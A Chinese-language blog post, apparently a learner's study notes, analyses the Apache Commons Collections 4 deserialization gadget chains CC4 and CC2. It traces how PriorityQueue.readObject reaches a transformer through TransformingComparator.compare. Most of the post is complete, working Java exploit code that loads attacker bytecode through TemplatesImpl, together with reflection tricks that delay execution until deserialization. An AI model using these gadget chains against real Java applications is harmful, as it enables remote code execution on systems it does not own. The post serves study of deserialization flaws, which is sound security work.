---
layout: post
title: Commons-Collection CC4链2链
tags: Java
---

# CC4

## 链分析

利用点仍然是`transform`，查找调用`transform`方法,找到`TransformingComparator`类的`compare`方法 ,`compare`也比较常见

```
    public int compare(final I obj1, final I obj2) {
        final O value1 = this.transformer.transform(obj1);
        final O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
```

继续查找谁的`readObject`调用了`compare`,后面查找到`PriorityQueue`类中`readObject`调用了`compare`方法

![1726548340115.jpg](\images\posts\Commons-Collection CC4链2链\1726548340115.jpg)

跟进`heapify`,再跟进`siftDown`,再跟进`siftDownUsingComparator`,在`siftDownUsingComparator`中调用的`compare`方法

![1726548417986.jpg](\images\posts\Commons-Collection CC4链2链\1726548417986.jpg)

链子就是:

> InstantiateTransformer.transform<==TransformingComparator.compare<==PriorityQueue.readObject

## 编写EXP

之前CC3的前半部分不变

```
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);

        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());


        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        serialize(priorityQueue);
        unserialize("CCTest1.txt");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

### 解决问题:

未弹出计算器,`heapify`方法打断点调试,可以发现在`heapify`方法里面`size`为0,减一后变成了-1没有进入for循环,没有执行`siftDown`方法.

![1726549378671.jpg](\images\posts\Commons-Collection CC4链2链\1726549378671.jpg)

可以通过反射修改size的值

### EXP1

```
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);

        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());


        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        Class aClass = PriorityQueue.class;
        Field size = aClass.getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue,2);
        serialize(priorityQueue);
        unserialize("CCTest1.txt");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

![1726549626486.jpg](\images\posts\Commons-Collection CC4链2链\1726549626486.jpg)

另外一种方法:`size`是`PriorityQueue`这个队列的长度

![1726550565576.jpg](\images\posts\Commons-Collection CC4链2链\1726550565576.jpg)

所以可以用`add`添加队列,但是add后也会调用到`compare`方法,导致在反序列化之前就在本地执行了

跟进`add`=>`offer`=>`siftUp`=>`siftUpUsingComparator`

![1726550853998.jpg](\images\posts\Commons-Collection CC4链2链\1726550853998.jpg)

所以在前面随便改一个值,`add`后又改回来就行

```
        ChainedTransformer chainedTransformer = new ChainedTransformer(new ChainedTransformer<>());
                Class chainedClass = chainedTransformer.getClass();
        Field declaredField = chainedClass.getDeclaredField("iTransformers");
        declaredField.setAccessible(true);
        declaredField.set(chainedTransformer,transformers);
```

或者

```
TransformingComparator transformingComparator = new TransformingComparator(new ChainedTransformer());
        Class transformingComparatorClass = transformingComparator.getClass();
        Field declaredField = transformingComparatorClass.getDeclaredField("transformer");
        declaredField.setAccessible(true);
        declaredField.set(transformingComparator,chainedTransformer);
```

都行

### EXP2

```
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);

        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());


        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(new ChainedTransformer());
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(3);
        priorityQueue.add(2);

        Class transformingComparatorClass = transformingComparator.getClass();
        Field declaredField = transformingComparatorClass.getDeclaredField("transformer");
        declaredField.setAccessible(true);
        declaredField.set(transformingComparator,chainedTransformer);


        serialize(priorityQueue);
//        unserialize("CCTest1.txt");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

![1726551808546.jpg](\images\posts\Commons-Collection CC4链2链\1726551808546.jpg)

# CC2链

## 编写EXP

CC2和CC4差距不大,就是没有用`Transformer`数组,用`InvokerTransformer`直接连接,调用后面`templates` 对象的`newTransformer`方法	

```
InvokerTransformer invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
```

`transformingComparator`这里改一下,不能使用之前CC4随便new的`ChainedTransformer`,因为 `PriorityQueue` 的排序是基于比较器的返回值进行的,`ChainedTransformer` 的执行过程会涉及多个 transformer 的调用，如果其中的某个 `transformer `返回了一个不合法的值，或者导致异常操作，它就可能会触发错误,而 `ConstantTransformer` 返回的值总是 `1`，这不会导致比较异常.

```
TransformingComparator transformingComparator = new TransformingComparator(new ChainedTransformer());
```

最后在添加`TemplatesImpl`对象就可以

```
priorityQueue.add(templates);
priorityQueue.add(2);
```

## EXP

```Java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);

        InvokerTransformer invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});


        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(2);

        Class transformingComparatorClass = transformingComparator.getClass();
        Field declaredField = transformingComparatorClass.getDeclaredField("transformer");
        declaredField.setAccessible(true);
        declaredField.set(transformingComparator,invokerTransformer);


        serialize(priorityQueue);
//        unserialize("CCTest1.txt");

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```
